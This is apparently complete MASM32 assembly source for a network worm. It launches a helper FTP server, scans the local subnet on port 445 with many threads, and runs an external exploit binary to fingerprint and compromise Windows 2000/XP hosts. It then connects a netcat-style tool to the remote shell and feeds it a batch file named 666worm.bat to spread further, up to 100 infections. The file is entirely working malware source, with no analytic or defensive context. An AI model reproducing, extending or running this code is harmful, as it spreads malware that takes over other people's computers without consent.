.386
.model flat, stdcall
option casemap :none

THREADS   EQU 16
PORT      EQU 445
TIMEOUT   EQU 12
MAXINFECT EQU 100

include c:\masm32\include\windows.inc
include c:\masm32\include\kernel32.inc
include c:\masm32\include\wsock32.inc
include c:\masm32\include\user32.inc

includelib c:\masm32\lib\kernel32.lib
includelib c:\masm32\lib\wsock32.lib
includelib c:\masm32\lib\user32.lib

SOCKET_INFO STRUCT
  socket    DWORD ?
  scanip    DWORD ?
SOCKET_INFO ENDS

connect_thread PROTO :DWORD
get_ip         PROTO
exploit        PROTO :DWORD
scan_subnet    PROTO :DWORD,:DWORD,:DWORD
run            PROTO :DWORD,:DWORD,:DWORD

.data
ip_fmt     db "%d.%d.%d.%d",0
query_fmt  db "5.exe 0 %s %d -t",0
attackfmt  db "5.exe %d %s %d",0
nc_fmt     db "6.exe -vv %s %d",0
inputfile  db "666worm.bat",0
ftpserver  db "1.exe",0
queryreply db "Detecting remote OS: Windows 5."
queryreply_size equ $-queryreply

our_ip	  dd 0
found     dd 0



.code

start   proc
  LOCAL wsainfo:WSADATA
  LOCAL runhnd:DWORD
  LOCAL pipe1:DWORD
  LOCAL pipe2:DWORD

	invoke run,offset ftpserver,ADDR pipe1,ADDR pipe2
	mov [runhnd],eax
        invoke WSAStartup,1,ADDR wsainfo

        invoke GetCommandLine
        xchg esi,eax
  @@:
        lodsb
        test al,al
        jz @@getip
	cmp al,"!"
	jne @b

	sub ebx,ebx
	push 4
	pop ecx
  @@:
	call @@atohex
	mov bl,dl
	ror ebx,8
	loop @b
	xchg eax,ebx
	jmp @f

  @@getip:
        invoke get_ip
  @@:
	mov [our_ip],eax
        mov edi,eax
        mov esi,eax
        shr esi,8
        shr eax,16
        and esi,0ffh
        and edi,0ffh

  @@:
        and eax,0ffh
        invoke scan_subnet,edi,esi,eax
        invoke GetTickCount
        cmp [found],MAXINFECT
        jb @b

        invoke WSACleanup
        invoke CloseHandle,[pipe1]
        invoke CloseHandle,[pipe2]
        invoke TerminateProcess,[runhnd],0
        invoke ExitProcess,0

  @@atohex:
  	sub eax,eax
  	cdq
  @@:
	lodsb
	sub al,"0"
	jb @f
	cmp al,9
	ja @f
	imul edx,edx,10
	add edx,eax
	jmp @b
  @@:
  	retn
start   endp



scan_subnet proc subnet_a_start:DWORD,subnet_b_start:DWORD,subnet_c_start:DWORD
  LOCAL buffer[MAX_PATH]:BYTE
  LOCAL tmp:DWORD
  LOCAL sockets[THREADS]:SOCKET_INFO
  LOCAL current_a:DWORD
  LOCAL current_b:DWORD
  LOCAL current_c:DWORD
  LOCAL current_d:DWORD

        pushad
        mov ebx,THREADS
        lea edi,sockets
  @@:
        invoke socket,AF_INET,SOCK_STREAM,IPPROTO_TCP
        mov [(edi+ebx*(size SOCKET_INFO)-(size SOCKET_INFO))+SOCKET_INFO.socket],eax
        mov [tmp],TRUE
        invoke ioctlsocket,[(edi+ebx*(size SOCKET_INFO)- \
                (size SOCKET_INFO))+SOCKET_INFO.socket],FIONBIO,ADDR tmp
        mov [(edi+ebx*(size SOCKET_INFO)-(size SOCKET_INFO))+SOCKET_INFO.scanip],0
        dec ebx
        jnz @b

        mov eax,[subnet_a_start]
        mov [current_a],eax
        mov eax,[subnet_b_start]
        mov [current_b],eax
        mov eax,[subnet_c_start]
        mov [current_c],eax
        mov [current_d],1

  @@scan:
        mov ebx,THREADS
  @@:
        lea esi,[edi+ebx*(size SOCKET_INFO)-(size SOCKET_INFO)]
        cmp [esi+SOCKET_INFO.scanip],0
        je @f
        dec ebx
        jnz @b
        invoke Sleep,100
        jmp @@scan
  @@:

        mov dl,byte ptr [current_d]
        shl edx,8
        mov dl,byte ptr [current_c]
        shl edx,8
        mov dl,byte ptr [current_b]
        shl edx,8
        mov dl,byte ptr [current_a]

	cmp [our_ip],edx
	je @f

        mov [esi+SOCKET_INFO.scanip],edx

        invoke CreateThread,NULL,0,offset connect_thread,esi,0,ADDR tmp
  @@:
        mov eax,[current_d]
        inc eax
        mov [current_d],eax
        cmp eax,255
        jb @@scan

  @@wait4all:
        mov ebx,THREADS
  @@:
        cmp [(edi+ebx*(size SOCKET_INFO)-(size SOCKET_INFO))+SOCKET_INFO.scanip],0
        jne @f
        dec ebx
        jnz @b
        jmp @@allreturned
  @@:
        invoke Sleep,100
        jmp @@wait4all

  @@allreturned:
        mov ebx,THREADS
  @@:
        invoke closesocket,[(edi+ebx*(size SOCKET_INFO)-(size SOCKET_INFO))+ \
               SOCKET_INFO.socket]
        dec ebx
        jnz @b

        popad
        ret
scan_subnet endp



connect_thread proc info:DWORD
  LOCAL sockinfo:sockaddr_in
  LOCAL timeout:timeval
  LOCAL readfds:fd_set
  LOCAL aux:DWORD

        pushad

        mov esi,[info]
        mov ebx,[esi+SOCKET_INFO.socket]
        mov eax,[esi+SOCKET_INFO.scanip]

        mov [sockinfo.sin_addr],eax
        invoke htons,PORT
        mov [sockinfo.sin_port],ax
        mov [sockinfo.sin_family],AF_INET

        invoke connect,ebx,ADDR sockinfo,size sockaddr

        mov [timeout.tv_sec],TIMEOUT
        mov [timeout.tv_usec],0

        mov [readfds.fd_count],1
        mov [readfds.fd_array],ebx

        invoke select,ebx,0,ADDR readfds,0,ADDR timeout
        dec eax
        jnz @f

        inc dword ptr [found]
        invoke CreateThread,0,0,offset exploit,[esi+SOCKET_INFO.scanip],0,ADDR aux

  @@:
        invoke shutdown,ebx,2
        invoke closesocket,ebx

        invoke socket,AF_INET,SOCK_STREAM,IPPROTO_TCP
        mov [esi+SOCKET_INFO.socket],eax
        mov [aux],1
        invoke ioctlsocket,[esi+SOCKET_INFO.socket],FIONBIO,ADDR aux

        mov [esi+SOCKET_INFO.scanip],0
        popad
        ret
connect_thread endp



get_ip proc
  LOCAL buffer[MAX_PATH]:BYTE
        pushad
        invoke gethostname,ADDR buffer,MAX_PATH
        invoke gethostbyname,ADDR buffer
        test eax,eax
        jz @f
        mov eax,[eax+hostent.h_list]
        test eax,eax
        jz @f
        mov eax,[eax]
        test eax,eax
        jz @f
        mov eax,[eax]
  @@:
        mov [esp+7*4],eax
        popad
        ret
get_ip endp



run     proc cmdline:DWORD,hnd:DWORD,hnd2:DWORD
  LOCAL pi:PROCESS_INFORMATION
  LOCAL _si:STARTUPINFO
  LOCAL pipe1_write:DWORD
  LOCAL pipe1_read:DWORD
  LOCAL pipe2_write:DWORD
  LOCAL pipe2_read:DWORD
  LOCAL sec:SECURITY_ATTRIBUTES

	sub eax,eax
        pushad

	mov [sec.nLength],size SECURITY_ATTRIBUTES
    	mov [sec.lpSecurityDescriptor],0
        mov [sec.bInheritHandle],TRUE

        invoke CreatePipe,ADDR pipe1_read,ADDR pipe1_write,ADDR sec,0
        test eax,eax
        jz @@error

        invoke CreatePipe,ADDR pipe2_read,ADDR pipe2_write,ADDR sec,0
        test eax,eax
        jz @@error

        sub eax,eax
        lea edi,pi
        mov ecx,size PROCESS_INFORMATION
        rep stosb
        lea edi,_si
        mov ecx,size STARTUPINFO
        rep stosb
        mov [_si.cb],size STARTUPINFO

        mov eax,[pipe1_write]
        mov [_si.hStdOutput],eax
        mov [_si.hStdError],eax
        mov eax,[pipe2_read]
        mov [_si.hStdInput],eax
        mov [_si.dwFlags],STARTF_USESTDHANDLES

        invoke CreateProcess,0,[cmdline],0,0,TRUE,0,0,0,ADDR _si,ADDR pi
        invoke CloseHandle,[pipe1_write]
        invoke CloseHandle,[pipe2_read]

	mov eax,[pipe1_read]
	mov ecx,[hnd]
	mov [ecx],eax
	mov eax,[pipe2_write]
	mov ecx,[hnd2]
	mov [ecx],eax

        mov eax,[pi.hProcess]
        mov [esp+7*4],eax
  @@error:
        popad
        ret
run     endp



exploit proc ip2attack:DWORD
  LOCAL ip_string[MAX_PATH]:BYTE
  LOCAL query[MAX_PATH]:BYTE
  LOCAL readbuf[4096]:BYTE
  LOCAL aux:DWORD
  LOCAL aux2:DWORD
  LOCAL port:DWORD
  LOCAL is_xp:DWORD
  LOCAL outhnd:DWORD
  LOCAL runhnd:DWORD
  LOCAL pipe1:DWORD
  LOCAL pipe2:DWORD

        pushad
        invoke GetStdHandle,STD_OUTPUT_HANDLE
        mov [outhnd],eax

        mov eax,[ip2attack]
        mov ecx,eax
        mov edx,eax
        mov ebx,eax
        shr ecx,8
        shr edx,16
        shr ebx,24
        and eax,0ffh
        and ecx,0ffh
        and edx,0ffh
        and ebx,0ffh
        invoke wsprintf,ADDR ip_string,offset ip_fmt,eax,ecx,edx,ebx

	invoke GetTickCount
	and eax,0fffh
	add eax,1000h
	mov [port],eax

        invoke wsprintf,ADDR query,offset query_fmt,ADDR ip_string,[port]

        mov [is_xp],-1
        invoke run,ADDR query,ADDR pipe1,ADDR pipe2
        test eax,eax
        jz @@error
        mov [runhnd],eax

  @@:
        invoke WaitForSingleObject,[runhnd],0
        cmp eax,WAIT_TIMEOUT
        jne @f
        invoke PeekNamedPipe,[pipe1],0,0,0,0,0
        test eax,eax
        jz @b

        invoke ReadFile,[pipe1],ADDR readbuf,4096,ADDR aux,0
        invoke WriteFile,[outhnd],ADDR readbuf,[aux],ADDR aux2,0

        lea esi,readbuf
        mov ecx,[aux]
        sub ecx,queryreply_size
        jbe @b
  @@search:
        pushad
        mov edi,offset queryreply
        mov ecx,queryreply_size
        repe cmpsb
        popad
        lodsb
        je @@found
        loop @@search
        jmp @b

  @@found:
        push 1
        pop ecx
        movzx eax,byte ptr [esi+queryreply_size-1]
        sub al,"0"
        je @@isw2k
        dec ecx
  @@isw2k:
        mov [is_xp],ecx
        jmp @b

  @@:
	invoke CloseHandle,[pipe1]
	invoke CloseHandle,[pipe2]

        mov eax,[is_xp]
        inc eax
        jz @@error

        invoke wsprintf,ADDR query,offset attackfmt,[is_xp],ADDR ip_string,[port]

        invoke run,ADDR query,ADDR pipe1,ADDR pipe2
        test eax,eax
        jz @@error
        mov [runhnd],eax

  @@:
        invoke WaitForSingleObject,[runhnd],0
        cmp eax,WAIT_TIMEOUT
        jne @f
        invoke PeekNamedPipe,[pipe1],0,0,0,0,0
        test eax,eax
        jz @b

        invoke ReadFile,[pipe1],ADDR readbuf,4096,ADDR aux,0
        invoke WriteFile,[outhnd],ADDR readbuf,[aux],ADDR aux2,0
        jmp @b

  @@:
	invoke CloseHandle,[pipe1]
	invoke CloseHandle,[pipe2]
        invoke OutputDebugString,ADDR ip_string

        invoke wsprintf,ADDR query,offset nc_fmt,ADDR ip_string,[port]

        invoke run,ADDR query,ADDR pipe1,ADDR pipe2
        test eax,eax
        jz @@error
        mov [runhnd],eax

        invoke CreateFile,offset inputfile,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0
        mov [aux2],eax
        inc eax
        jz @@error
        invoke ReadFile,[aux2],ADDR readbuf,4096,ADDR aux,0
        invoke CloseHandle,[aux2]

        invoke WriteFile,[pipe2],ADDR readbuf,[aux],ADDR aux2,0

        sub esi,esi
  @@:
        invoke PeekNamedPipe,[pipe1],0,0,0,0,0
        test eax,eax
        jnz @@output

        cmp esi,10
        je @f
        invoke WaitForSingleObject,[runhnd],1*1000
        cmp eax,WAIT_TIMEOUT
        jne @@error
        inc esi
        jmp @b

  @@output:
        sub esi,esi
        invoke ReadFile,[pipe1],ADDR readbuf,4096,ADDR aux,0
        invoke WriteFile,[outhnd],ADDR readbuf,[aux],ADDR aux2,0
        jmp @b

  @@:
	invoke CloseHandle,[pipe1]
	invoke CloseHandle,[pipe2]
        invoke TerminateProcess,[runhnd],0

  @@error:
        popad
        ret
exploit endp


end     start
